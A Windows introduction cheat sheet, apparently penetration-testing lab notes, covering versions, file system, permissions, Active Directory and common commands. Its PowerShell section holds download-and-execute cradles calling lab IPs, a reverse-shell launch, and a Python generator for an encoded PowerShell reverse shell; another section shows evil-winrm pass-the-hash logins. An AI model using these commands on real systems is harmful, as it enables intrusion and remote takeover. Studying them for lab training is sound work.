---
title: Windows introduction
description: Windows basic guide.
---

# Windows introduction

## History

Windows versions:

1.  Windows 1
2.  Windows 2
3.  Windows 2.x
4.  Windows 3.x
5.  Windows 95
6.  Windows 98
7.  Windows NT
8.  Windows XP
9.  Windows Vista
10.  Windows 7
11.  Windows 8.x
12.  Windows 10
13.  Windows 11
  
Windows server versions:  

1.  Windows Server 2003
2.  Windows Server 2008
3.  Windows Server 2012 / 2012 R2
4.  Windows Server 2016
5.  Windows Server 2019

Documentation about [windows server](https://www.microsoft.com/en-us/windows-server).

Difference between Windows 10 : [pro vs home](https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro).

## File system

Architecture of C Drive :

1. **PerfLogs** - Stores the system issues and other reports regarding performance
2. **Program Files and Program Files (x86)** - Is the location where programs install unless you change their path (Ex: Choosing to install software on D drive)
3. **Users** - In this folder are stored the users created. It also stores users generated data (Ex: Saving a file on your Desktop)
4. **Windows** - It's the folder which basically contains the code to run the operating system and some utility tools (we'll talk about them later)

## File permissions

Permissions can be applied to:

- Users
- Groups

Permissions that can be set are:

- **Full control** - allows the user/users/group/groups to set the ownership of the folder, set permission for others, modify, read, write, and execute files.
- **Modify** - allows the user/users/group/groups to modify, read, write, and execute files.
- **Read & execute** - allows the user/users/group/groups to read and execute files.
- **List folder contents** - allows the user/users/group/groups to list the contents (files, subfolders, etc) of a folder.
- **Read** - only allows the user/users/group/groups to read files.
- **Write** - allows the user/users/group/groups to write data to the specified folder (automatically set when "Modify" right is checked).

**Note :** You can allow or deny permissions for users or groups. To set permissions for a file or folder right click on the file and select "Properties". Go to the "Security" tab and click on the "Edit" button.

---

You can check, set and remove permission using [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) - displays or modifies discretionary access control lists (DACLs).

Example :

```powershell
# Show permissions
C:\ > icacls C:\Windows
# Changes the owner of all matching files to the specified user.
C:\ > icacls C:\Windows /setowner <user>
# To grant the user User1 Delete and Write DAC permissions to a file named Test1, type:
C:\ > icacls test1 /grant User1:(d,wdac)
...
```

- I - permission inherited from the parent container
- F - full access (full control)
- M - Modify right/access
- OI - object inherit
- IO - inherit only
- CI - container inherit
- RX - read and execute
- AD - append data (add subdirectories)
- WD - write data and add files

## Authentification

 **Authentication** is a process for **verifying the identity of a person** (or an object or a service). When you authenticate a person, the goal is to verify that the person is not an imposter.
 
**Local authentication** is done using the **Local Security Authority** (LSA). LSA is a protected subsystem that keeps track of the security policies and the accounts that are on a computer system. It also maintains information about all aspects of local security on a computer.

### Active directory

There are two types of Active Directory:

- On-Premise Active Directory (AD)
- Azure Active Directory (AAD)

**On-premise Active Directory** has a record of all users, PCs and Servers and authenticates the users signing in (the network logon). Once signed in, Active Directory also governs what the users are, and are not, allowed to do or access (authorization).

In an on-premise Active Directory environment the authentication can be made by using the following protocols:

- NTLM
- LDAP / LDAPS
- KERBEROS

**Azure Active Directory** is a secure online authentication store, which can contain users and groups. Users have a username and a password which are used when you sign in to an application that uses Azure Active Directory for authentication. So, for example, all of the Microsoft Cloud services use Azure Active Directory for authentication: Office 365, Dynamics 365 and Azure.

Azure Active Directory supports the following authentication methods:

- SAML (Security Assertion Markup Language)
- OAUTH 2.0
- OpenID Connect

### Techniques

**Domain Controller** - Might be one of the most important servers because in an AD or AAD infrastructure we can control users, groups, restrict actions, improve security, and many more of other computers and servers.

A **GPO** or a **Group Policy Object** is a feature of Active Directory that adds additional controls to user accounts and computers.

## Utility tools

- Local User and Group Management : `lusrmgr.msc`
- System Configuration : `MSConfig`
- Windows version : `winver`
- The **Computer Management** (`compmgmt`) utility has three primary sections: System Tools, Storage, and Services and Applications. (task scheduler, event logs, shares, ...)
 - Registry Editor : `regedit`
 - Task scheduler
 - Event viewer

## Cmd / Powershell

### Search for files

```powershell
c:\>dir winPEASx64.exe /s
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

12/05/2021  03:55 AM         1,926,656 winPEASx64.exe
               1 File(s)      1,926,656 bytes

     Total Files Listed:
               1 File(s)      1,926,656 bytes
               0 Dir(s)  21,130,096,640 bytes free
```

### HTTP Requests

```powershell
# Invoke-WebRequest
PS C:\> IWR 'https://example.com/files/backup.zip' -OutFile C:\backup.zip
```

```powershell
PS C:\> wget http://10.9.52.138:8000/winPEASx64.exe -outfile winPEASx64.exe
```

### Run a PowerShell expression

```powershell
# Invoke-Expression
PS C:\> IEX(IWR 'http://10.10.10.10:8000/revshell.ps1')

C:\> powershell.exe -EncodedCommand <base64>
```

Example with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/Invoke-PowerShellTcp.ps1')
PS C:\> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 8080
```

```powershell
C:\> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.52.138:8000/shell.exe','shell.exe')"
C:\> .\shell.exe
PS C:\> Start-Process "shell.exe"
```

### Reverse shell generator (powershell & base64)

```python
#!/usr/bin/env python3
from sys import argv
from base64 import b64encode


if __name__ == '__main__':
    if len(argv) < 2:
        print(f"{argv[0]} <IP> <PORT>")
        exit()

    ip, port = argv[1], argv[2]
    payload = '$client = New-Object System.Net.Sockets.TCPClient("' + ip + '",' + port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    cmdline = "powershell.exe -e " + b64encode(payload.encode('utf16')[2:]).decode()
    print(cmdline)
```

## Permissions

The permissions are:

-   **Full control**
-   **Modify**
-   **Read & Execute**
-   **List folder contents**
-   **Read**
-   **Write**


## Powershell


## User Account Control (UAC)

```powershell
# Using password
$ evil-winrm -i 10.10.163.154 -u 'admin' -p 'password123'

# Using LM hash (from SAM)
$ evil-winrm -i 10.10.163.154 -u 'admin' -H 'a9fdfa038c4b75ebc76dc855dd74f0da'
```


The User Account Control (UAC) aims to improve the security of Microsoft Windows by limiting application software to standard user privileges until an administrator authorizes an increase or elevation. In this way, only applications trusted by the user may receive administrative privileges, and malware should be kept from compromising the operating system. In other words, a user account may have administrator privileges assigned to it, but applications that the user runs do not inherit those privileges unless they are approved beforehand or the user explicitly authorizes it.

![Windows Security alerts in Windows 10](https://upload.wikimedia.org/wikipedia/en/7/72/User_Account_Control.png)

> Source [Wikipedia](https://en.wikipedia.org/wiki/User_Account_Control).

## Type of accounts

| Account              | Permissions   |
| :------------------- | :------------ |
| Guest                | Can use portable software and can not change system settings. |
| Standard             | Can use portable software and change system settings that don’t affect other users. |
| Administrator        | Complete control over the PC. |
| System               | Complete control over the PC. |
| Domain Administrator | Complete control over all the PC of the domain. |

User accounts can be one of two types on a typical local Windows system: **Administrator** & **Standard User**.

The user account type will determine what actions the user can perform on that specific Windows system. 

-   An Administrator can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc. 
-   A Standard User can only make changes to folders/files attributed to the user & can't perform system-level changes, such as install programs.

`lusrmgr.msc` => Local User and Group Management.

## Information gathering

### Networks information

IPv4, DNS Server, Network Mask, Mac Adress, ...

```powershell
C:\> ipconfig /all
```

### Environment variables

Display all the environment variables :

```powershell
C:\> set
```

- **%APPDATA% :** Path to the application data directory.
- **%TEMP% :** Path to the temporary directory.
- **%PUBLIC% :** Path to the public directory (all users have READ & WRITE permission)
- **%LOGONSERVER% :** Authentification server.
- **%WINDIR%** : Windows directory. 
- ...

### User & group information

- List current user privileges : `whoami /priv`
- List users : `net users`
- Show details about a specific user : `net user administrator`
- Change password of a user : `net user james newPassowrd123`
- Run command as another user : `runas /user:Administrator "dir C:\Users\Administrator"`
- List groups : `net localgroup`
- Show details about a specific group : `net localgroup "Remote Management Users"`
- List hotfix : `wmic qfe get Caption,Description,HotFixId,InstalledOn`
- List softwares : `wmic product get name,version,vendor`
- Network connections : `netstat -ano`
- List scheduled tasks : `schtasks.exe /query /fo LIST /v`
- List drivers : `driverquery`
- List all running serivces : `wmic service list brief | findstr Running`
- Show details about a specific service : `sc qc RemoteMouseService`
- Start / stop  a specific service : `sc <start:stop> <service_name>`
- Check if folder is writable : `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"`

Find information about the current user :

```powershell
C:\> net user %username%
C:\> net user %username% /domain
```

Find administration users and groups :

```powershell
C:\> net localgroup administrators
```


## Manage permissions

### Microsoft Management Console (MMC)

You use **Microsoft Management Console** (MMC) to create, save and open administrative tools, called consoles, which manage the hardware, software, and network components of your Microsoft Windows operating system. MMC runs on all client operating systems that are currently supported.

> Source [Microsoft](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console).

Lauch the MMC panel :

```powershell
C:\> mmc.exe
```

Displays all available information about Group Policy :

```powershell
C:\> gpresult /z
```

> Docs about [gpresult](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult).

### Registry Editor (regedit)

The **Windows Registry** is a hierarchical database that stores low-level settings for the Microsoft Windows operating system and for applications that opt to use the registry. The kernel, device drivers, services, Security Accounts Manager, and user interfaces can all use the registry. The registry also allows access to counters for profiling system performance. 

> Source [Wikipedia](https://en.wikipedia.org/wiki/Windows_Registry).

Path for policies in regedit :
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies
HKEY_CURRENT_USER\Software\Policies
LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies
LOCAL_MACHINE\Software\Policies
```

## Windows firewall

Windows Firewall (officially called Windows Defender Firewall in Windows 10), is a firewall component of Microsoft Windows.

> Source [Wikipedia](https://en.wikipedia.org/wiki/Windows_Firewall).

```powershell
C:\> netsh advfirewall
```

## Windows commands

### cd

```
C:\> e:
E:\> d:
D:\> cd Documents
D:\Documents>
```

- `C:` Windows system disk.
- `D:` Data storage disk.
- `E:` Data storage disk.
- `X:` Disk use by Windows PE to start. 

!!! info
    The name of a disk is just a label, the letters are totally arbitrary.

### dir

List content of a directory.

### mkdir
`mkdir` create directory.

```
C:\> mkdir <directory>
```

### del
`del` delete file.

```
C:\> del <filename>
```

### rmdir
`rmdir` delete folder.

```
C:\> rmdir <folder>
```

!!! info
    Use the argument `/S` to remove all the files within the folder.

### move

```
C:\> move <src> <dst>
```

### copy
`copy` only copies files, but not the folders within.

```
C:\> copy <src> <dst>
```

### xcopy
`xcopy` copies files (including the folders within).

```
C:\> xcopy <src> <dst>
```

### md5sum

```powershell

c:\Users\user>powershell.exe Get-FileHash -Algorithm MD5 reverse_installer.msi
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             2C7D2CD065478FB7C5F3E15A3827DA95                                       C:\Users\user\reve...
```

### icacls

Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories.

 ## References
 
 - [THM - intro2windows](https://tryhackme.com/room/intro2windows)